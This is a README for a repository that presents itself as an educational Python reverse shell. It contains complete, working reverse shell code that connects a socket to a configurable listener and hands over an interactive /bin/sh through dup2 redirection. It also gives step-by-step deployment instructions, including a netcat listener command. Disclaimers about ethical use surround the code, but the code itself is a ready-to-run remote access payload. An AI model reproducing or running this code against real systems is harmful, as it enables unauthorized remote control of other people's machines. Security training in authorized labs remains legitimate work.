# ⚡ Python Reverse Shell Demo

![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)
![Security](https://img.shields.io/badge/Security-Educational-red.svg)
![License](https://img.shields.io/badge/License-MIT-green.svg)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20macOS-lightgrey.svg)

### 🎓 Educational Python Reverse Shell for Cybersecurity Training

A simple, well-documented reverse shell implementation in Python designed specifically for ethical hacking education and cybersecurity training. Learn network programming and penetration testing fundamentals safely and legally.

---

## ⚠️ Important Disclaimer

**FOR EDUCATIONAL USE ONLY!**

This code is strictly for:
- 🎓 Cybersecurity education and training
- 📚 Learning ethical hacking concepts
- 🧪 Authorized penetration testing labs
- 📄 Security research with permission

⛔ **Unauthorized use is illegal and strictly prohibited!**

---

## ✨ Features

- 🐍 **Pure Python** - No external dependencies required
- 📚 **Well-Commented** - Easy to understand code structure
- 🔧 **Simple Setup** - Quick configuration and deployment
- 🎯 **Educational** - Perfect for learning networking concepts
- 🔒 **Safe Demo** - Designed for controlled environments

---

## 🛠️ How It Works

1. **Connection**: Script connects to a remote listener (attacker machine)
2. **Shell Access**: Provides command-line interface to the target system
3. **Execution**: Executes commands sent from the listener
4. **Demonstration**: Shows reverse shell concepts in action

---

## 🚀 Quick Start

### Prerequisites

- Python 3.x installed
- Network connectivity
- Permission to test in your environment

### Setup

1. **Start a listener** on your machine:
```bash
nc -lvp 4444
```

2. **Configure the script**:
- Edit `host` to your listener IP address
- Edit `port` to match your listener port

3. **Run the script** on the target (training) machine:
```bash
python reverse_shell.py
```

---

## 💻 Code Example

```python
# Educational Python Reverse Shell
# For cybersecurity training only

import socket, subprocess, os

host = '127.0.0.1'  # Change to your listener IP
port = 4444         # Change to your listener port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

p = subprocess.call(['/bin/sh', '-i'])
```

---

## 🎯 Learning Objectives

- Understanding reverse shell concepts
- Network socket programming in Python
- Client-server communication
- Process execution and redirection
- Ethical hacking methodologies

---

## 🛡️ Security Notes

- ⚠️ Always use in isolated lab environments
- 🔒 Never deploy on production systems
- 📄 Obtain written permission before testing
- 📊 Use for defensive security training
- ⚖️ Comply with all local laws and regulations

---

## 🤝 Contributing

Contributions for educational improvements are welcome:
- 🐛 Report security issues
- 💡 Suggest educational enhancements
- 📚 Improve documentation
- ⭐ Star for educational value

---

## 📄 License

MIT License - For educational purposes only

---

## 👨‍💻 Author

**Rahit Biswas**
- 🌐 Website: [codaphics.com](https://codaphics.com)
- 💼 LinkedIn: [Rahit Biswas](https://www.linkedin.com/in/rahit-biswas-786939153)
- 📧 Email: r.codaphics@gmail.com

---

**🔴 ETHICAL HACKING AND CYBERSECURITY EDUCATION ONLY!** 🔴
